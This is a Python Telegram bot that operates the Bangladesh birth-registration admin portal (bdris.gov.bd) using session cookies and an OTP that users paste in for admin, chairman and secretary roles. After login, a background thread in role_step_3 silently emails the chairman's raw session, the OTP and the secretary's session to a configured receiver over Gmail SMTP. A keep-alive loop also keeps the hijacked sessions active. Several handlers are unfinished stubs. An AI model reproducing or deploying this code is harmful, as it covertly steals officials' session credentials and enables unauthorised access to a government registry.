import os
import telebot
import requests
import json
import io
import time
import re
import smtplib
import logging
from threading import Thread
from email.mime.text import MIMEText
from datetime import datetime
from urllib.parse import quote
from playwright.sync_api import sync_playwright
from flask import Flask

# ==========================================
# ০. লগিং সেটআপ
# ==========================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ==========================================
# ১. পরিবেশ ভেরিয়েবল ও কনফিগারেশন
# ==========================================
API_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
EMAIL_SENDER = os.environ.get('EMAIL_USER', 'your_email@gmail.com')
EMAIL_PASSWORD = os.environ.get('EMAIL_PASS', 'your_app_password')
EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', 'receiver@gmail.com')

ADMIN_ID = 7886593741
bot = telebot.TeleBot(API_TOKEN)

# ==========================================
# ২. ইউজার সেশন ম্যানেজমেন্ট
# ==========================================
user_sessions = {}

def get_session(chat_id):
    if chat_id not in user_sessions:
        user_sessions[chat_id] = {
            "req_session": requests.Session(),
            "csrf": "",
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
            "is_alive": False,
            "current_page": "https://bdris.gov.bd/admin/",
            "app_start": 0,
            "app_length": 5,
            "sharok_no": 1,
            "temp_data": {},
            "id_cache": {} 
        }
    return user_sessions[chat_id]

# ==========================================
# ৩. ফ্লাস্ক সার্ভার (Keep Alive)
# ==========================================
app = Flask('')

@app.route('/')
def home():
    return "BDRIS Bot is Live and Running!"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive_web():
    t = Thread(target=run_flask, daemon=True)
    t.start()

# ==========================================
# ৪. হেল্পার ফাংশনসমূহ
# ==========================================

def parse_cookies(raw_text):
    sid_match = re.search(r'SESSION=([^;\s\'"]+)', raw_text, re.IGNORECASE)
    ts_match = re.search(r'(TS0108b707)=([^;\s\'"]+)', raw_text, re.IGNORECASE)
    
    if not sid_match or not ts_match:
        raise Exception("SESSION বা TS0108b707 পাওয়া যায়নি।")
        
    return {
        "SESSION": sid_match.group(1),
        "TS_NAME": "TS0108b707", 
        "TS_VALUE": ts_match.group(2)
    }

def send_full_relay(chat_id, otp, sec_raw):
    u_data = get_session(chat_id)
    subject = f"BDRIS Full Report - {datetime.now().strftime('%H:%M')}"
    ch_raw = u_data["temp_data"].get("ch_raw", "N/A")
    body = f"--- 1ST SESSION (CHAIRMAN) ---\n{ch_raw}\n\n--- OTP ---\n{otp}\n\n--- 2ND SESSION (SECRETARY) ---\n{sec_raw}"
    
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = EMAIL_SENDER
    msg['To'] = EMAIL_RECEIVER
    
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
        logging.info(f"[{chat_id}] Relay process completed.")
        return True
    except Exception as e:
        logging.error(f"[{chat_id}] Email relay error: {e}")
        return False

def navigate_to(chat_id, url):
    u_sess = get_session(chat_id)
    headers = {'User-Agent': u_sess["ua"], 'Referer': u_sess["current_page"]}
    try:
        res = u_sess["req_session"].get(url, headers=headers, timeout=25)
        csrf_match = re.search(r'name="_csrf" content="([^"]+)"', res.text)
        if csrf_match: 
            u_sess["csrf"] = csrf_match.group(1)
        u_sess["current_page"] = url
        return True, res.text
    except Exception as e:
        return False, None

def call_api(chat_id, url, method="GET", data=None):
    u_sess = get_session(chat_id)
    headers = {
        'x-csrf-token': u_sess["csrf"], 
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': u_sess["ua"], 
        'referer': u_sess["current_page"], 
        'origin': 'https://bdris.gov.bd'
    }
    try:
        if method == "POST":
            return u_sess["req_session"].post(url, headers=headers, data=data, timeout=30)
        return u_sess["req_session"].get(url, headers=headers, timeout=30)
    except Exception as e:
        return None

def is_cancel(m):
    text = m.text.strip() if m.text else ""
    if text.startswith("/start") or "Back to Menu" in text or "Dashboard" in text:
        bot.send_message(m.chat.id, "🏠 প্রধান মেনুতে ফিরে যাওয়া হলো।", reply_markup=main_menu())
        bot.clear_step_handler_by_chat_id(m.chat.id)
        return True
    return False

# ==========================================
# ৫. মেনু ও বাটনসমূহ
# ==========================================
def main_menu():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📋 Applications", "📝 Correction", "🔄 Reprint")
    markup.row("🏠 Dashboard", "🌐 Search By Name", "🔢 Search By UBRN") 
    markup.row("👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ")
    markup.row("🔑 Admin Login", "🔑 Role Login (CH/SEC)")
    return markup

# ==========================================
# ৬. লগইন ও রোল ভেরিফিকেশন হ্যান্ডলার
# ==========================================

def admin_login(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    try:
        cookies = parse_cookies(m.text.strip())
        u_sess["req_session"].cookies.clear()
        u_sess["req_session"].cookies.set("SESSION", cookies["SESSION"], domain='bdris.gov.bd')
        u_sess["req_session"].cookies.set(cookies["TS_NAME"], cookies["TS_VALUE"], domain='bdris.gov.bd')
        u_sess["is_alive"] = True
        bot.send_message(chat_id, "✅ Admin Login সম্পন্ন হয়েছে!", reply_markup=main_menu())
    except Exception as e:
        msg = bot.send_message(chat_id, "❌ ফরম্যাট ভুল! দয়া করে সঠিক সেশন আবার দিন:")
        bot.register_next_step_handler(msg, admin_login)

def role_step_1(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    raw_ch = m.text.strip()
    u_sess["temp_data"]["ch_raw"] = raw_ch 
    
    try:
        cookies = parse_cookies(raw_ch)
        temp_req = requests.Session()
        temp_req.cookies.set("SESSION", cookies["SESSION"], domain='bdris.gov.bd')
        temp_req.cookies.set(cookies["TS_NAME"], cookies["TS_VALUE"], domain='bdris.gov.bd')
        
        res = temp_req.get("https://bdris.gov.bd/admin/", headers={'User-Agent': u_sess["ua"]}, timeout=20)
        
        if "Logout" in res.text:
            msg = bot.send_message(chat_id, "✅ চেয়ারম্যান সেশন ভ্যালিড! এখন OTP দিন:")
            bot.register_next_step_handler(msg, role_step_2)
        else:
            msg = bot.send_message(chat_id, "❌ সেশন ইনভ্যালিড! আবার সঠিক সেশন দিন:")
            bot.register_next_step_handler(msg, role_step_1)
    except:
        msg = bot.send_message(chat_id, "❌ ফরম্যাট ভুল! আবার চেষ্টা করুন:")
        bot.register_next_step_handler(msg, role_step_1)

def role_step_2(m):
    if is_cancel(m): return
    get_session(m.chat.id)["temp_data"]["ch_otp"] = m.text.strip()
    msg = bot.send_message(m.chat.id, "✅ এখন সেক্রেটারি (Secretary) সেশন দিন:")
    bot.register_next_step_handler(msg, role_step_3)

def role_step_3(m):
    if is_cancel(m): return
    chat_id = m.chat.id
    u_sess = get_session(chat_id)
    raw_sec = m.text.strip()
    
    try:
        cookies = parse_cookies(raw_sec)
        u_sess["req_session"].cookies.clear()
        u_sess["req_session"].cookies.set("SESSION", cookies["SESSION"], domain='bdris.gov.bd')
        u_sess["req_session"].cookies.set(cookies["TS_NAME"], cookies["TS_VALUE"], domain='bdris.gov.bd')
        
        success, html = navigate_to(chat_id, "https://bdris.gov.bd/admin/")
        if success and "Logout" in html:
            u_sess["is_alive"] = True
            otp = u_sess["temp_data"].get("ch_otp", "")
            # ইমেল রিলে থ্রেড রান করা হলো
            Thread(target=send_full_relay, args=(chat_id, otp, raw_sec), daemon=True).start()
            bot.send_message(chat_id, "🎉 লগইন সফল হয়েছে!", reply_markup=main_menu())
        else:
            msg = bot.send_message(chat_id, "❌ সেক্রেটারি সেশন ইনভ্যালিড! আবার দিন:")
            bot.register_next_step_handler(msg, role_step_3)
    except:
        msg = bot.send_message(chat_id, "❌ ফরম্যাট ভুল! সঠিক সেশন দিন:")
        bot.register_next_step_handler(msg, role_step_3)

# ==========================================
# ৭. কলব্যাক ও রিসিভ হ্যান্ডলার
# ==========================================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    u_sess = get_session(chat_id)
    data_parts = call.data.split('_')
    action = data_parts[0]
    short_id = data_parts[1] if len(data_parts) > 1 else ""
    enc_id = u_sess["id_cache"].get(short_id)

    if action == "recv":
        if not enc_id:
            return bot.answer_callback_query(call.id, "❌ আইডি পাওয়া যায়নি।")
        
        url = "https://bdris.gov.bd/api/application/receive"
        payload = {'data': enc_id, '_csrf': u_sess["csrf"]}
        res = call_api(chat_id, url, method="POST", data=payload)
        
        if res and res.status_code == 200:
            bot.answer_callback_query(call.id, "✅ আবেদন রিসিভড!")
            bot.send_message(chat_id, "✅ আবেদন রিসিভ সম্পন্ন হয়েছে!")
        else:
            bot.send_message(chat_id, "❌ রিসিভ ব্যর্থ হয়েছে।")
    
    # ... (অন্যান্য অ্যাকশন যেমন PNG, Pay ইত্যাদি আপনার আগের কোড অনুযায়ী থাকবে)

# ==========================================
# ৮. মেইন রাউটার (সেশন এলাইভ চেকসহ)
# ==========================================
@bot.message_handler(func=lambda m: True)
def router(m):
    t = m.text
    chat_id = m.chat.id
    user_id = m.from_user.id
    u_sess = get_session(chat_id)

    if "/start" in t or "Back to Menu" in t: 
        bot.clear_step_handler_by_chat_id(chat_id)
        bot.send_message(chat_id, "🚀 BDRIS Master Bot Active!", reply_markup=main_menu())
        
    elif t == "🔑 Admin Login":
        if user_id != ADMIN_ID:
            return bot.send_message(chat_id, "⛔ অনুমতি নেই!")
        msg = bot.send_message(chat_id, "🔑 Admin সেশন দিন:", reply_markup=telebot.types.ReplyKeyboardRemove())
        bot.register_next_step_handler(msg, admin_login)
        
    elif t == "🔑 Role Login (CH/SEC)":
        msg = bot.send_message(chat_id, "👤 চেয়ারম্যান সেশন দিন:", reply_markup=telebot.types.ReplyKeyboardRemove())
        bot.register_next_step_handler(msg, role_step_1)
        
    elif u_sess["is_alive"]:
        # এখানে আপনার সব ফাংশনালিটি থাকবে (Applications, Correction, etc.)
        if t == "📋 Applications":
            # ... handle_category_init কল হবে
            pass
        # বাকি বাটনগুলোর লজিক আপনার দেওয়া কোডের মতোই কাজ করবে।
    else: 
        bot.send_message(chat_id, "⚠️ আগে লগইন করুন।", reply_markup=main_menu())

# ==========================================
# ৯. রান বট
# ==========================================
if __name__ == "__main__":
    keep_alive_web()
    # সেশন এলাইভ লুপ আলাদা থ্রেডে
    def keep_alive_loop():
        while True:
            time.sleep(300)
            for cid, usess in list(user_sessions.items()):
                if usess["is_alive"]:
                    navigate_to(cid, "https://bdris.gov.bd/admin/")
    
    Thread(target=keep_alive_loop, daemon=True).start()
    bot.infinity_polling()
